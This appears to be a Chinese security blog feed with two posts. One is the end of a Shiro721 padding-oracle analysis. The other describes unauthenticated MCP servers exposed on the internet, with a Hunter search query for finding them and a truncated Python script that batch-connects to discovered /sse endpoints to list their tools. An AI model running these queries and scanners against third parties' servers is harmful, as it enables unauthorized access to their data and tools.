Oracle爆破计算）；</li></ol></li></ol><p>简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值。</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a>密钥生成</h3><p>在 Shiro550 中，密钥是硬编码，就像下面这样</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-05%20at%2007.33.01@2x.png"></p><p>而在Shiro721中，硬编码取消了而是改为动态生成，如图代码</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-14%20at%2021.48.51@2x.png" alt="CleanShot 2025-08-14 at 21.48.51@2x"></p><p>根据上图，那么我们的目标就很明确了，找到<code>generateNewKey</code>这个关键方法的所在地方，定位到<code>org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey(int)</code></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2010.50.54@2x.png" alt="CleanShot 2025-08-15 at 10.50.54@2x"></p><blockquote><p>这段代码的功能是生成一个新的加密密钥：<br>通过KeyGenerator.getInstance()获取指定算法的密钥生成器实例<br>如果算法不存在则抛出异常<br>初始化密钥生成器的密钥长度<br>生成并返回新的密钥<br>核心作用是根据指定的算法名称和密钥位数创建对应的加密密钥。</p></blockquote><p>初始化了一个<code>KeyGenerator</code>对象并调用<code>init()</code>方法初始化其参数，跟进看看参数是怎么被赋值的</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2011.00.43@2x.png" alt="CleanShot 2025-08-15 at 11.00.43@2x"></p><p>获取了一个随机数生成器SecureRandom，继续跟进init()</p><p>往下看，这里 mySpi 是 <code>AESKeyGenerator</code>，跟进 <code>engineInit()</code> 方法，进行了 AES 算法的初始化。</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2011.06.20@2x.png" alt="CleanShot 2025-08-15 at 11.06.20@2x"></p><blockquote><p>engineInit()方法作用如下：</p><p>验证密钥长度是否为8的倍数且在有效范围内（128&#x2F;192&#x2F;256位）<br>将传入的密钥长度（bit）转换为字节单位存储<br>调用另一个初始化方法设置随机数生成器<br>如果密钥长度不符合要求则抛出参数异常。</p></blockquote><p>回到 <code>org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()</code>，跟进 <code>generateKey()</code> 方法</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2011.08.31@2x.png" alt="CleanShot 2025-08-15 at 11.08.31@2x"></p><p>在 <code>com.sun.crypto.provider.AESKeyGenerator#engineGenerateKey()</code> 方法也下个断点，不然不会停在这里。</p><p>跟进到最后可见这里已经生成了一串16字节的随机序列，并且返回一个 <code>SecretKeySpec</code> 对象，再使用<code>getEncoded()</code> 方法获取 <code>key</code> 密钥序列。</p><blockquote><p>关于这段随机序列的形成过程，在与于java.security.SecureRandom#nextBytes(byte[])和java.util.Arrays#fill(byte[], byte)，不过并不重要，只是一些简单的形成</p></blockquote><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2011.20.02@2x.png" alt="CleanShot 2025-08-15 at 11.20.02@2x"></p><p>至此就是 Shiro721 完整的密钥生成过程。</p><h3 id="在-shiro721-中的Padding-Oracle-Attack"><a href="#在-shiro721-中的Padding-Oracle-Attack" class="headerlink" title="在 shiro721 中的Padding Oracle Attack"></a>在 shiro721 中的Padding Oracle Attack</h3><p>要成功进行 Padding Oracle Attack 是需要服务端返回两个不同的响应特征来进行 Bool 判断的。</p><p>在 Apache Shiro 的场景中，这个服务端的两个不同的响应特征为：</p><ul><li>Padding Oracle 错误时，服务端响应报文的 Set-Cookie 头字段返回 <code>rememberMe=deleteMe</code>；</li><li>Padding Oracle 正确时，服务端返回正常的响应报文内容；</li></ul><p>我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的 Cookie，Shiro 是怎么处理的呢？</p><h4 id="0x01-Padding-Oracle错误处理"><a href="#0x01-Padding-Oracle错误处理" class="headerlink" title="0x01 Padding Oracle错误处理"></a>0x01 Padding Oracle错误处理</h4><p>跟550一样去找解密函数，在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt()</code> 中</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2013.08.02@2x.png" alt="CleanShot 2025-08-15 at 13.08.02@2x"></p><p>跟进关键方法<code>cipherService.decrypt()</code>，最后到<code>crypt()</code>中调用<code>doFinal()</code>方法</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2013.13.39@2x.png" alt="CleanShot 2025-08-15 at 13.13.39@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2013.15.15@2x.png" alt="CleanShot 2025-08-15 at 13.15.15@2x"></p><p>看一下<code>doFinal()</code>方法实现的功能，注释已经写的很清楚了</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2013.19.33@2x.png" alt="CleanShot 2025-08-15 at 13.19.33@2x"></p><p><code>doFinal()</code>方法有<code>IllegalBlockSizeException</code>和<code>BadPaddingException</code>这两个异常，分别用于捕获块大小异常和填充错误异常。异常会被抛出到<code>crypt()</code>方法中，最终被<code>getRememberedPrincipals()</code>方法捕获，并执行<code>onRememberedPrincipalFailure()</code>方法。</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.25.16@2x.png" alt="CleanShot 2025-08-15 at 14.25.16@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.31.05@2x.png" alt="CleanShot 2025-08-15 at 14.31.05@2x"></p><p><code>onRememberedPrincipalFailure()</code>方法调用了<code>forgetIdentity()</code>。在Shiro550中我们分析过，该方法会调用<code>removeFrom()</code>，在response头部添加字段<code>Set-Cookie: rememberMe=deleteMe</code>。</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.35.08@2x.png" alt="CleanShot 2025-08-15 at 14.35.08@2x"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.35.28@2x.png" alt="CleanShot 2025-08-15 at 14.35.28@2x"></p><p>倘若Padding结果不正确的话，响应包就会返回 <code>Set-Cookie: rememberMe=deleteMe</code> 。</p><h4 id="0x02-Padding正确，反序列化错误处理"><a href="#0x02-Padding正确，反序列化错误处理" class="headerlink" title="0x02 Padding正确，反序列化错误处理"></a>0x02 Padding正确，反序列化错误处理</h4><p>Shiro中关于反序列化的处理在 <code>org.apache.shiro.io.DefaultSerializer#deserialize()</code> 方法下</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-08-15%20at%2014.50.12@2x.png" alt="CleanShot 2025-08-15 at 14.50.12@2x"></p><p>如果反序列化的结果错误，则会抛出异常。最后异常仍会被<code>getRememberedPrincipals()</code>方法处理。</p><p>但是对于Java来说，反序列化是以Stream的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化，那么自然而然去构造一些恶意命令是允许的，也就是最终形成漏洞的原因</p><p>于是这里就构造出了布尔条件</p><ul><li>Padding 正确，服务器正常响应</li><li>Padding 错误，服务器返回 <code>Set-Cookie: rememberMe=deleteMe</code></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>721主要的解密过程没有变，只要你成功padding进去了，就能走到反序列化那一步，个人感觉不用理解那么透彻，本身这个漏洞也挺鸡肋，需要登陆成功的身份认证cookie才能攻击。</p><p>根据验证成功的cookie来Padding，并在后方构造不会影响原本的序列化，形成漏洞</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">Java反序列化Shiro篇02-Shiro721流程分析</a></p><p><a href="https://goodapple.top/archives/261">Java反序列化漏洞——Shiro721</a></p><p><a href="https://www.cnblogs.com/dhan/p/18423531">Shiro-721—漏洞分析(CVE-2019-12422)</a></p>]]></content>
    
    
    <categories>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>部署在公网的mcp可能存在的一个未授权问题</title>
    <link href="/2025/08/24/%E9%83%A8%E7%BD%B2%E5%9C%A8%E5%85%AC%E7%BD%91%E7%9A%84mcp%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E4%B8%80%E4%B8%AA%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
    <url>/2025/08/24/%E9%83%A8%E7%BD%B2%E5%9C%A8%E5%85%AC%E7%BD%91%E7%9A%84mcp%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E4%B8%80%E4%B8%AA%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>有效期截止到2025年08月24日依然有效，目前还是可以利用用来挖漏洞的状态</strong></p><p>MCP（Model Context Protocol）是由Anthropic于2024年11月推出的一种开放标准，旨在解决大型语言模型（LLM）与外部数据源和工具之间的通信问题。其主要目标是打破当前AI模型的数据孤岛限制，从而使AI应用能够更加高效地访问和操作本地及外部的数据源。</p><p>MCP的核心目标包括：</p><ol><li><strong>增强数据互通性</strong>：使得不同的AI模型能够在不依赖单一系统的情况下，灵活地与外部资源进行交互。</li><li><strong>消除环境依赖</strong>：提供一个统一的通信协议，简化模型与外部工具的集成，使得模型在不同的环境中能无缝运行。</li><li><strong>提高效率</strong>：减少传统的调用和数据传输方式中的延迟，从而提高系统的整体响应速度和准确性。</li></ol><p>可以把它理解为一个”中介协议”，使得AI模型能够在不同的数据平台和工具之间顺利通信，实现更复杂的任务和功能。</p><p>MCP已经出来很长一段时间了，市面上出现的大量开源MCP服务是没有鉴权的，即可以直接使用uvicorn部署到公网，那么这就导致一个大问题，也是传统web渗透中特别常见的问题——未授权访问，攻击者可以不经过授权直接去调用这些MCP，操作本地及远程数据本身就存在高危风险，也是会出现漏洞的地方。</p><h1 id="MCP支持的通信模式"><a href="#MCP支持的通信模式" class="headerlink" title="MCP支持的通信模式"></a>MCP支持的通信模式</h1><p>MCP（模型上下文协议）主要支持以下三种通信模式：</p><h2 id="1-STDIO模式（标准输入输出）"><a href="#1-STDIO模式（标准输入输出）" class="headerlink" title="1. STDIO模式（标准输入输出）"></a>1. STDIO模式（标准输入输出）</h2><p>STDIO是MCP最常见、互操作性最好的通信模式，也是官方推荐的方式。它使用标准输入&#x2F;输出流进行通信，特别适用于本地进程。</p><p><strong>特点：</strong></p><ul><li>通过标准输入输出流传递数据</li><li>简单易于实现</li><li>适合本地进程间通信</li><li>无需网络配置</li><li>自然的进程生命周期管理</li><li>使用一种简单的消息帧格式，包括<code>Content-Length</code>头和JSON-RPC消息</li></ul><p><strong>局限性：</strong></p><ul><li>只适用于本地进程</li><li>每个服务器仅限一个客户端</li><li>没有内置认证机制</li><li>可能存在阻塞问题</li></ul><h2 id="2-SSE模式（服务器发送事件）"><a href="#2-SSE模式（服务器发送事件）" class="headerlink" title="2. SSE模式（服务器发送事件）"></a>2. SSE模式（服务器发送事件）</h2><p>SSE使用HTTP进行客户端到服务器的请求，使用SSE（Server-Sent Events）进行服务器到客户端的消息传递。这种方式适合Web应用程序和远程服务器。根据最新信息，SSE现在被视为已弃用，但仍然被许多工具支持。</p><p><strong>特点：</strong></p><ul><li>客户端通过HTTP POST请求发送消息</li><li>服务器通过SSE事件发送消息回客户端</li><li>可以通过标准HTTP工作</li><li>支持远程客户端</li><li>可以服务多个客户端</li><li>与Web基础设施集成</li></ul><p><strong>局限性：</strong></p><ul><li>实现较为复杂</li><li>需要HTTP服务器</li><li>连接管理更具挑战性</li><li>可能存在防火墙问题</li></ul><h2 id="3-Streaming-HTTP模式"><a href="#3-Streaming-HTTP模式" class="headerlink" title="3. Streaming HTTP模式"></a>3. Streaming HTTP模式</h2><p>这是在较新版本的MCP规范中添加的模式，用于替代SSE模式。Streaming HTTP服务器可以”原样”部署。</p><p><strong>特点：</strong></p><ul><li>使用HTTP长连接进行双向通信</li><li>更适合现代Web应用</li><li>可能有更好的兼容性和性能</li><li>与现代Web标准更加一致</li></ul><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>MCP支持三种主要的通信模式：STDIO（标准输入&#x2F;输出）、SSE（服务器发送事件）和Streaming HTTP。当前的mcp_client.py脚本专注于检测SSE模式的服务器，但可以扩展以支持其他通信模式。STDIO是官方推荐的模式，具有最好的互操作性，而SSE现在被视为已弃用但仍然受到支持。</p><h1 id="公网部署MCP服务存在的未授权"><a href="#公网部署MCP服务存在的未授权" class="headerlink" title="公网部署MCP服务存在的未授权"></a>公网部署MCP服务存在的未授权</h1><p>以常见的机器学习模型服务通常涉及到将预训练的模型（如 TensorFlow、PyTorch 模型）通过 API 提供服务为例，部署代码为</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;mcpServers&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;ml_model&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;uv&quot;</span>,<br>      <span class="hljs-string">&quot;args&quot;</span>: [<br>        <span class="hljs-string">&quot;--directory&quot;</span>,<br>        <span class="hljs-string">&quot;path/to/ml_model_server&quot;</span>,<br>        <span class="hljs-string">&quot;run&quot;</span>,<br>        <span class="hljs-string">&quot;ml_model_server&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;env&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;MODEL_PATH&quot;</span>: <span class="hljs-string">&quot;/path/to/your/model&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>亦或者是常见的消息队列服务有 <strong>RabbitMQ</strong> 和 <strong>Kafka</strong>的部署，部署代码为</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;mcpServers&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;rabbitmq&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;uv&quot;</span>,<br>      <span class="hljs-string">&quot;args&quot;</span>: [<br>        <span class="hljs-string">&quot;--directory&quot;</span>,<br>        <span class="hljs-string">&quot;path/to/rabbitmq_mcp_server&quot;</span>,<br>        <span class="hljs-string">&quot;run&quot;</span>,<br>        <span class="hljs-string">&quot;rabbitmq_mcp_server&quot;</span><br>      ],<br>      <span class="hljs-string">&quot;env&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;RABBITMQ_HOST&quot;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&quot;RABBITMQ_PORT&quot;</span>: <span class="hljs-string">&quot;5672&quot;</span>,<br>        <span class="hljs-string">&quot;RABBITMQ_USER&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>,<br>        <span class="hljs-string">&quot;RABBITMQ_PASSWORD&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>用户将自己的相关信息<strong>RABBITMQ_HOST</strong>、<strong>RABBITMQ_PORT</strong>、<strong>RABBITMQ_USER</strong>、<strong>RABBITMQ_PASSWORD</strong>填入后部署，并且将其放到公网上，那么即可被攻击者获取到</p><p>hunter查询uvicorn部署mcp语法：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">header</span>.<span class="hljs-keyword">server</span>==&quot;uvicorn&quot;&amp;&amp;<span class="hljs-keyword">header</span>.status_code==&quot;404&quot;&amp;&amp;<span class="hljs-keyword">header</span>=&quot;text/plain&quot;<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2001.44.22@2x.png"></p><p>如果要使用SSE模式的mcp，直接逐个访问访问&#x2F;sse 判断是否存在sse模式的MCP，其他模式类似，给出我所使用的批量处理的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span><br><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> AsyncExitStack<br><br><span class="hljs-comment"># 避免与已安装的mcp包冲突，使用完整导入路径</span><br><span class="hljs-keyword">import</span> mcp<br><span class="hljs-keyword">from</span> mcp <span class="hljs-keyword">import</span> ClientSession, StdioServerParameters<br><span class="hljs-keyword">from</span> mcp.client.sse <span class="hljs-keyword">import</span> sse_client<br><br><span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv<br><span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> AsyncOpenAI, OpenAI<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 从CSV文件中提取URL</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_urls_from_csv</span>(<span class="hljs-params">csv_file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    从CSV文件中提取URL列的数据</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    参数:</span><br><span class="hljs-string">        csv_file_path: CSV文件路径</span><br><span class="hljs-string">        </span><br><span class="hljs-string">    返回:</span><br><span class="hljs-string">        包含所有有效URL的列表</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    urls = []<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(csv_file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            csv_reader = csv.DictReader(file)<br>            <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> csv_reader:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;url&#x27;</span> <span class="hljs-keyword">in</span> row <span class="hljs-keyword">and</span> row[<span class="hljs-string">&#x27;url&#x27;</span>]:<br>                    url = row[<span class="hljs-string">&#x27;url&#x27;</span>]<br>                    <span class="hljs-comment"># 确保URL不以/sse结尾，因为我们会在后面添加</span><br>                    <span class="hljs-keyword">if</span> url.endswith(<span class="hljs-string">&#x27;/sse&#x27;</span>):<br>                        url = url[:-<span class="hljs-number">4</span>]<br>                    urls.append(url)<br>        <span class="hljs-keyword">return</span> urls<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;读取CSV文件时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> []<br><br><span class="hljs-comment"># 从CSV文件中提取URL</span><br>urls = extract_urls_from_csv(<span class="hljs-string">&#x27;assets_2025725.csv&#x27;</span>) <span class="hljs-comment"># hunter查询出的数据导出</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_tools_to_json</span>(<span class="hljs-params">url, tools, output_file</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将URL和对应的工具信息保存到JSON文件中</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    参数:</span><br><span class="hljs-string">        url: 服务器URL</span><br><span class="hljs-string">        tools: 工具字典</span><br><span class="hljs-string">        output_file: 输出文件路径</span><br><span class="hljs-string">        </span><br><span class="hljs-string">    返回:</span><br><span class="hljs-string">        成功返回True，失败返回False</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 确保输出目录存在</span><br>        output_dir = os.path.dirname(output_file)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_dir):<br>            os.makedirs(output_dir)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;创建输出目录: <span class="hljs-subst">&#123;output_dir&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># 准备要保存的数据</span><br>        tools_data = &#123;&#125;<br>        <span class="hljs-keyword">for</span> tool_name, tool <span class="hljs-keyword">in</span> tools.items():<br>            <span class="hljs-comment"># 安全地获取工具属性</span><br>            tool_info = &#123;<br>                <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-built_in">getattr</span>(tool, <span class="hljs-string">&#x27;name&#x27;</span>, tool_name),<br>                <span class="hljs-string">&#x27;description&#x27;</span>: <span class="hljs-built_in">getattr</span>(tool, <span class="hljs-string">&#x27;description&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            &#125;<br>            <br>            <span class="hljs-comment"># 安全地获取参数信息</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(tool, <span class="hljs-string">&#x27;parameters&#x27;</span>):<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-comment"># 尝试将参数转换为可序列化的格式</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(tool.parameters, <span class="hljs-built_in">dict</span>):<br>                        tool_info[<span class="hljs-string">&#x27;parameters&#x27;</span>] = tool.parameters<br>                    <span class="hljs-keyword">else</span>:<br>                        tool_info[<span class="hljs-string">&#x27;parameters&#x27;</span>] = <span class="hljs-built_in">str</span>(tool.parameters)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;处理工具参数时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                    tool_info[<span class="hljs-string">&#x27;parameters&#x27;</span>] = <span class="hljs-built_in">str</span>(tool.parameters)<br>            <br>            tools_data[tool_name] = tool_info<br>        <br>        <span class="hljs-comment"># 创建包含URL和工具信息的数据结构</span><br>        data_to_save = &#123;<br>            <span class="hljs-string">&#x27;url&#x27;</span>: url,<br>            <span class="hljs-string">&#x27;tools&#x27;</span>: tools_data,<br>            <span class="hljs-string">&#x27;timestamp&#x27;</span>: datetime.datetime.now().isoformat()<br>        &#125;<br>        <br>        <span 